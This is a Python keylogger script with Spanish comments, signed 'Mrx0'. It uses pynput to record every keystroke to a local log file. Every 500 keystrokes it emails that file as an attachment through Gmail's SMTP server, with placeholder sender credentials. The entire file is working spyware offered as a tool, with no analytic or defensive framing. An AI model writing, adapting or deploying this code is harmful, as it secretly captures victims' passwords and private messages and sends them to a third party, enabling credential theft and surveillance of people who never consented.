#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Comnezamos importando la libreria pynput 
# para el registro del teclado+raton

###################################
#        ! keylogger ¡            #
#    -*-powered....by....Mrx0-*-  #
###################################
from pynput.keyboard import Listener
import sys
import smtplib
import os
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# 2 funcion ahora definiremos la funcion de capturar el registro
contador = 0  # var contadora teclas
filename = 'log.txt'


def captura(key):
    global contador
    contador += 1
    tecla = str(key)
    tecla = tecla.replace("'", "")
    # print(" Evento\ncapturado: ", tecla)

    # el texto se guarda sin ninguna separacion
    # condicionaremos para que se ordene 
    # y podamos leer la info guardada

    if tecla == 'Key.space':  # esta condicion sistituye la barra space por un espacio
        tecla = ' '
        with open(filename, 'a') as f:
            f.write(tecla + " ")
    if tecla == "Key.enter":  # enter se sistituye por salto de linea
        tecla = "\n"
        with open(filename, 'a') as f:
            f.write(tecla + " ")
    if tecla == "Key.esc":  # aqui se cerrara con el programa con ESC
        sys.exit()
    else:
        with open(filename, 'a') as f:
            f.write(tecla + " ")
    # print("palabras escritas " + str(contador))
    if contador == 500:
        # print("Mandando correo")
        send_email()
        contador = 0


# primera funcion
def send_email():
    try:
        fromaddr = 'correo'
        toaddrs = 'correo'
        username = 'correo'
        password = 'contraseña'
        asunto = 'prueba'
        header = MIMEMultipart()
        header['Subject'] = asunto
        header['From'] = fromaddr
        header['To'] = username

        mensaje = MIMEText("capturado", 'html')  # Content-type:text/html
        header.attach(mensaje)
        if os.path.isfile(filename):
            adjunto = MIMEBase('application', 'octet-stream')
            adjunto.set_payload(open(filename, "rb").read())
            encode_base64(adjunto)
            adjunto.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(filename))
            header.attach(adjunto)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(username, password)
        server.sendmail(fromaddr, toaddrs, header.as_string())
    except Exception as e:
        print(e)


if __name__ == '__main__':
    try:
        with Listener(on_press=captura) as c:
            c.join()
    except KeyboardInterrupt:

        exit()
